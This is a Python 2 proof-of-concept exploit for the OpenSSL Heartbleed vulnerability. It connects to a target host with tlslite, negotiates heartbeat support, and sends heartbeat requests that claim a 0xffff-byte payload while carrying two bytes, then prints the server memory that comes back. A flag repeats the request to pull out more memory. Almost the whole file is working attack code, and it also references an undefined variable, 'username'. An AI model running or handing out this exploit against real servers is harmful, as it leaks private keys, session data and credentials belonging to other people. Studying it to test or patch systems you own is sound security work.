import socket
import sys
import getopt
import time

from tlslite.api import *
from tlslite.messages import *
from tlslite import __version__

def usage():
    print "heartbleed.py   PoC for the openSSL heartbleed vulnerability"
    print "      -h  --  show this message"
    print "      -d  --  Set the destiation host and port:  HOST:PORT"
    print "      -n  --  Set the number of requests to make, more will grab more memory"

try:
    opts, args = getopt.getopt(sys.argv[1:], "hd:n:")
except getopt.GetoptError as err:
    print str(err)
    usage()
    sys.exit(2)

numb = 1
address = "127.0.0.1:443"

for o, a in opts:
    if o == "-d":
        address = a.split(":")
        if len(address) != 2:
            raise SyntaxError("Must specify <host>:<port>")
        address = ( address[0], int(address[1]) )
    elif o == "-n":
        numb = int(a)
    elif o == "-h":
        usage()
        sys.exit()
    else:
        assert False, "unhandled option"


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(5)
sock.connect(address)
connection = TLSConnection(sock)

settings = HandshakeSettings()
settings.heart_beat = True

try:
    start = time.clock()
    connection.handshakeClientCert(None, None, settings=settings, serverName=address[0])

    stop = time.clock()        
except TLSLocalAlert as a:
    if a.description == AlertDescription.user_canceled:
        print(str(a))
    else:
        raise
    sys.exit(-1)
except TLSRemoteAlert as a:
    if a.description == AlertDescription.unknown_psk_identity:
        if username:
            print("Unknown username")
        else:
            raise
    elif a.description == AlertDescription.bad_record_mac:
        if username:
            print("Bad username or password")
        else:
            raise
    elif a.description == AlertDescription.handshake_failure:
        print("Unable to negotiate mutually acceptable parameters")
    else:
        raise
    sys.exit(-1)

# printGoodConnection(connection, stop-start)

heartbeat = HeartBeat()
heartbeat.create(type=1,
                pay_len=0xffff,
                payload="AA")


# up the range numbs to get more memory, sometimes it repeats.

for x in range(0, numb):
    for result in connection._sendMsg(heartbeat):
        pass

    print connection.readPOC(0xffff),

connection.close()
